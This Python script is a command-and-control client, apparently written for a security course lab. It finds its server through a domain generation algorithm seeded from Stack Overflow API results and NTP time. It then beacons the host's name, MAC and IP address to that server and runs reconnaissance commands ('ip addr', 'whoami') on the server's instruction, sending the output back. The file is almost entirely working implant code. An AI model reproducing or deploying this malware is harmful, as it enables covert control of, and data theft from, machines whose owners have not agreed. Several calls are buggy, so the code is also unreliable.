#!/usr/bin/python

# NOTE: Much inspiration take from https://g3tsyst3m.com/c2/python/Create-your-own-C2-using-Python-Part-1/
import subprocess
import socket
import os
import time
import threading
import ntplib
import requests
import json
import uuid
from datetime import datetime, timedelta, timezone

def generate_dga_list() -> list[str]:
    NTP_URL = "pool.ntp.org"
    SEED_URL_TEMPLATE = "https://api.stackexchange.com/2.3/posts?fromdate={}&todate={}&order=desc&sort=votes&site=stackoverflow"
    QUESTIONS_URL_TEMPLATE = "https://api.stackexchange.com/2.3/questions/{}?site=stackoverflow&filter=withbody"
    ALLOWED_CHARS = "bcdfghjklmnpqrstvwxyz0123456789"
    ACCEPTABLE_DGA_DOMAINS = [".csc840.lan", ".com", ".press", ".me", ".cc"]

    # get current UTC time from reliable ntp server
    timeserver = ntplib.NTPClient()
    ntp_response = timeserver.request(NTP_URL, version=3)
    time_now = datetime.fromtimestamp(ntp_response.tx_time, timezone.utc)
    to_date = datetime(time_now.year, time_now.month, time_now.day)
    from_date = to_date - timedelta(days=5)

    # Use timespan to get posts made on stackoverflow.com during that time
    current_seed_url = SEED_URL_TEMPLATE.format(int(from_date.timestamp()), int(to_date.timestamp()))
    seed_response = requests.get(current_seed_url)
    posts = json.loads(seed_response.text)

    # Use id highest voted post during that time to establish which domain ending
    # to start with and the first max length to use.
    starting_domain_index = posts["items"][0]["post_id"] % len(ACCEPTABLE_DGA_DOMAINS)
    max_url_length = (posts["items"][0]["post_id"] % 15)
    if max_url_length < 9:
        max_url_length += 9

    # Get list of 10 post ids that are 'questions'
    post_ids = []
    for post in posts["items"]:
        if post["post_type"] == "question":
            post_ids.append(str(post["post_id"]))
        if len(post_ids) >= 10:
            break

    # Use those ids to get body text of questions
    tmp = ';'.join(post_ids)    
    questions_response = requests.get(QUESTIONS_URL_TEMPLATE.format(tmp))
    questions_json =  json.loads(questions_response.text)

    # Use body text to generate variable length first part of domains
    dga_strings = []
    for question_json in questions_json["items"]:
        filtered_body = ""
        skip_count = 0
        for letter in question_json["body"]:
            # Always skip the first 5 characters (<p> tag)
            if skip_count < 5:
                skip_count += 1
                continue
            # only let allowed letters be added to the string
            if letter in ALLOWED_CHARS:
                filtered_body += letter
            
            # if we have met max length, update max length to next
            # appropriate length and stop
            if len(filtered_body) == max_url_length:
                max_url_length +=1
                if max_url_length > 15:
                    max_url_length = 9
                break

        # if we somehow didn't quite make the cut, add some to the end
        while len(filtered_body) < 9:
            filtered_body += str(9-len(filtered_body))
        
        dga_strings.append(filtered_body + ACCEPTABLE_DGA_DOMAINS[starting_domain_index])
        # Update to the next appropriate index in the domain ending list
        starting_domain_index +=1
        starting_domain_index %= len(ACCEPTABLE_DGA_DOMAINS)
    return dga_strings


port=80  # Use standard port to comply with HTTP GET for lab 11


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def generate_beacon():
    # Get basic info about this client:
    my_hostname = socket.gethostname()
    my_ip = socket.gethostbyname(my_hostname)
    my_mac = hex(uuid.getnode()).replace('0x','')
    my_beacon = f"{my_hostname}|{my_mac}|{my_ip}|{datetime.now().timestamp()}"
    return my_beacon

def receiver(client):

    try:
        #client.send(setup_cmd.encode('UTF-8'))
        found_url = ''
        while True:
            if found_url == '':
                dga_urls = generate_dga_list()
                for url in dga_urls:
                    try:
                        socket.gethostbyname(url)
                        # if we get here, we succeeded
                        # rendezvous state
                        found_url = url
                        print(f"Rendezvous point [{url}] found!")
                        client.close()
                        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        client.connect(url, port)
                        print("sending beacon")
                        client.send(generate_beacon())
                        print("requst")
                        response = requests.get(url)  # generate HTTP GET
                        break
                    except:
                        print(f"Could not connect to [{url}]. Trying others...")
                        time.sleep(1)
            
            if found_url == '':
                # We didn't find a single rendezvous within our list, so cool off
                # "blocked/wait" state
                wait_s = 5  # short for demo, but would be longer for real client
                print(f"Rendezvous point inactive: waiting {wait_s}s to search again.")
                time.sleep(wait_s)
                continue
            else:
                print("connecting to rendezvous")

            try:
                print("receiving data")
                data=client.recv(1024)
                if ":ipinfo:" in data:
                    ipinfo = subprocess.run(["ip","addr"], capture_output=True, text=True)
                    ipinfo = "IP-INFO" + ipinfo.stdout.strip() + "\n\n"
                    client.send(ipinfo.encode('UTF-8'))
                if ":user:" in data:
                    user = subprocess.run(["whoami"], capture_output=True, text=True)
                    user = f"USER: {user}\n\n"
                    client.send(user.encode('UTF-8'))
            except:
                print("server died!")
                client.close()
                found_url = ''  # go back to wait state and look for new url
                continue

            time.sleep(1)
            print("sending another beacon")
            client.send(generate_beacon())
    except:
        print("fatal error, exiting")
        os._exit(1)

handler_thread = threading.Thread(target=receiver, args=(client, ))
handler_thread.daemon = True
handler_thread.start()

while True:
    time.sleep(1)
